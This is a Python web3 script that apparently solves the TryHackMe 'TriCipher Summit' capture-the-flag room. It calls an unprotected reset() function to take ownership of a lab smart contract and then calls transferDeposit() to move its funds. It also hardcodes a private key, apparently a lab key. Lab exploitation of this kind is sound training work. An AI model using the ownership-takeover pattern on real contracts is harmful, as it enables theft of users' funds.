# script to solve TryHack3M: TriCipher Summit Hack a crypto smart contract https://tryhackme.com/r/room/tryhack3mencryptionchallenge
# script with help of many online blogs articles regarding python and web3, final script was updated by ChatGPT

from web3 import Web3
from web3.middleware import geth_poa_middleware

def initialize_web3():
    node_url = "http://geth:8545"
    web3 = Web3(Web3.HTTPProvider(node_url))
    web3.middleware_onion.inject(geth_poa_middleware, layer=0)
    assert web3.is_connected(), "Connection to the node failed"
    return web3

def get_contract_instance(web3, contract_address, abi):
    return web3.eth.contract(address=contract_address, abi=abi)

def fetch_nonce(web3, address):
    return web3.eth.get_transaction_count(address)

def create_transaction(web3, contract, function, account, nonce, gas_price='50', gas=2000000):
    transaction = function.build_transaction({
        'nonce': nonce,
        'from': account.address,
        'gas': gas,
        'chainId': 31337,  # Adjust chain ID as necessary
        'gasPrice': web3.to_wei(gas_price, 'gwei')
    })
    signed_txn = web3.eth.account.sign_transaction(transaction, account._private_key)
    tx_hash = web3.eth.send_raw_transaction(signed_txn.rawTransaction)
    return tx_hash


def main():
    web3 = initialize_web3()
    
    # Replace these with your actual address and private key
    caller_address = "0xe89EE853150B7837a84ee1F08b376d12db654142"
    private_key = "0xb69bf3037bd0bc135377ba492a75b53236228e22a6ad2c42f7873b5722b27f28"
    
    contract_address = "0xE8B291589C19d39199EB01d5e6f5D2a22b3F868d"

    abi = '[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"INITIAL_BALANCE","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"balances","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"deposit","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_address","type":"address"}],"name":"getBalanceFromAddress","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getOwnerBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"isSolved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"resetAddress","type":"address"}],"name":"reset","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"transferDeposit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"you_solved_it","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}]'
    
    contract = get_contract_instance(web3, contract_address, abi)
    account = web3.eth.account.from_key(private_key)
    nonce = fetch_nonce(web3, account.address)
    
    # Get current owner address
    current_owner = contract.functions.owner().call()
    print("Current Owner Address:", current_owner)

    # Reset owner
    reset_function = contract.functions.reset(caller_address)
    tx_hash = create_transaction(web3, contract, reset_function, account, nonce)
    web3.eth.wait_for_transaction_receipt(tx_hash)
    nonce += 1
    
    # Verify new owner
    new_owner = contract.functions.owner().call()
    print("New Owner Address:", new_owner)

    # Perform transfer
    transfer_function = contract.functions.transferDeposit()
    tx_hash = create_transaction(web3, contract, transfer_function, account, nonce)
    web3.eth.wait_for_transaction_receipt(tx_hash)
    print("Transfer completed, transaction hash:", tx_hash.hex())

if __name__ == "__main__":
    main()

